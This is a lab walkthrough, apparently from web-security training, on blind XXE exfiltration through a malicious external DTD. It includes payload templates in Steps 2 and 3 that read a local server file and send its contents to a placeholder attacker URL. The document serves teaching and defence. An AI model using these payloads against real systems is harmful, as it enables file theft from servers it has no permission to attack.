# Lab 05 – Blind XXE with Malicious External DTD

## Objective

Exploit blind XXE to retrieve sensitive data from the server through an external DTD and an out-of-band interaction.

---

# Vulnerability

The application processes XML but does not directly return the value of an external entity.

The attack therefore uses:

```text
Parameter Entity
       ↓
External DTD
       ↓
Local File
       ↓
Out-of-Band Request
```

---

# Step 1 — Identify the XML Endpoint

Intercept an XML request in Burp Suite.

Send it to:

```text
Burp Repeater
```

---

# Step 2 — Prepare an External DTD

Host a malicious DTD on a server you control.

Conceptual structure:

```xml
<!ENTITY % file SYSTEM "file:///path/to/file">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'YOUR-CONTROLLED-URL/?x=%file;'>">
%eval;
%exfil;
```

The exact resource and encoding depend on the target environment.

---

# Step 3 — Reference the External DTD

The XML request can reference the external DTD using a parameter entity:

```xml
<!DOCTYPE foo [
    <!ENTITY % xxe SYSTEM "YOUR-EXTERNAL-DTD-URL">
    %xxe;
]>
```

---

# Step 4 — Send the Request

Send the XML request.

The parser retrieves the external DTD and processes its declarations.

---

# Step 5 — Monitor the OOB Server

The external DTD causes the server to make an outbound request containing data derived from the local resource.

Conceptually:

```text
Local File
    ↓
External Entity
    ↓
Malicious DTD
    ↓
HTTP Request
    ↓
Controlled Server
```

---

# Attack Flow

```text
Attacker XML
      ↓
External DTD
      ↓
Parameter Entity
      ↓
Local File
      ↓
Exfiltration Request
      ↓
Controlled Server
```

---

# Why an External DTD Is Useful

Complex parameter-entity definitions may not be possible entirely inside the original XML document.

Moving the entity declarations into an external DTD provides greater flexibility.

---

# Verification

Check the controlled server for the resulting interaction.

The request may contain data derived from the targeted local resource.

---

# Key Learning

Blind XXE can sometimes be converted into a data-exfiltration channel by combining:

```text
Parameter Entities
+
External DTD
+
Out-of-Band Interaction
```